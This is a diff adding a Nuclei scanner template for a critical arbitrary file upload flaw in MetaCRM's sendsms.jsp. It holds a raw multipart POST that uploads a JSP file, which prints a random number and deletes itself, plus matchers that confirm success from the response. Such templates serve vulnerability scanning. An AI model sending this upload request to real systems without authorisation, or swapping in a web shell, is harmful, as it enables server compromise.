@@ -1,0 +1,43 @@
+id: metasoft-crm-sendsms-fileupload
+
+info:
+  name: MetaCRM sendsms.jsp Arbitrary File Upload
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://mp.weixin.qq.com/s/coFu4oeZ4RgFoynIApR8MQ
+    - https://github.com/wooluo/nuclei-templates-2025hw/blob/37e9617426e2a696c8c338b15df99abd6294a4eb/metacrm-sendsms-file-upload.yaml#L4
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips: 上传结果在响应中
+    repair:
+    version:
+  tags: fileupload,metasoft
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+http:
+  - raw:
+      - |
+        POST /business/common/sms/sendsms.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpW22
+
+        ------WebKitFormBoundary03rNBzFMIytvpW22
+        Content-Disposition: form-data; name="file"; filename="1.jsp"
+
+        <%out.println(new java.util.Random().nextInt(100));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundary03rNBzFMIytvpW22--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'webapps','userfile')
+        condition: and
